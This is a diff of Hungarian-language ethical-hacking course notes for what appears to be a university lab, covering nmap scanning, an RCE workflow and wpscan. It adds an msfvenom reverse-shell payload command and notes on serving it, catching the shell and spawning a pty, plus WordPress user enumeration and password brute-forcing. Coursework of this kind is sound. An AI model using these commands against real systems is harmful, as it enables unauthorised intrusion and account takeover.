@@ -1,7 +1,12 @@
 ethack.infra.inf.unideb.hu
 Student<szám> (felhasználónév és jelszó)
 vnc.html-ben Stud<szám>
+
+Jelszavaknál: 5000 próbálkozásnál több nem kell
+
+
 Nmap
+!!Általában nmap -sS -sV <IP> -- a kezdő parancs
  <IP> -- infókat mond az ip-ről
  -sn <IP tart> -- ip felderítés
  -p <port/tartomány> <IP> -- portok tesztelés -p- az összes, -sU az UDP-t is nézi
@@ -73,7 +78,7 @@ command shell:
 
 RCE (Remote Code Execution) sérülékenység kihasználása:
  - előfeltételek:
-   - Attacker gépen OS shellkód készítése (célpont OS-ére, nekünk linux x64)
+   - Attacker gépen OS shellkód készítése (célpont OS-ére, nekünk linux x64) (msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf)
    - Attacker gépen: python3 -m http.server (port) -- webszerver nyitása !!abból a mappából ahol a shellkód van!!
    - Attacker gépen listener nyitása (külön terminálban kényelmesebb)
  - CMD rész: (lépések között ls -l /tmp -vel tesztelhetjük a mappastruktúrát)
@@ -85,3 +90,12 @@ RCE (Remote Code Execution) sérülékenység kihasználása:
 
 Fenti parancsok egy php fájlba, ami githubon is fent van.
 Ebből interaktív shell-t úgy csinálunk hogy "python3 -c "import pty;pty.spawn('/bin/bash')"
+
+Wordpress oldalak:
+wpscan: (!!sudo wpscan!!)
+ --url <ip> -- mindig kezdőoldal kell
+ --enumerate u/vp/ap/vt/at/dbe -- több opció, users, vulnerable/all plugins, all themes, database exports
+(biztonsági lépés, wp-content és hasonló mappák átnevezése)
+ --random-agent -- minden kérés random agent
+ --usernames <nevek> --passwords <jelszavak> --lehetnek fájlok is, feltörésre, nem "kézzel bruteforce-ol", máshol próbál bejelentkezni mint egy felhasználó
+ --wp-content-dir -- a wp-content mappa neve ha tudjuk
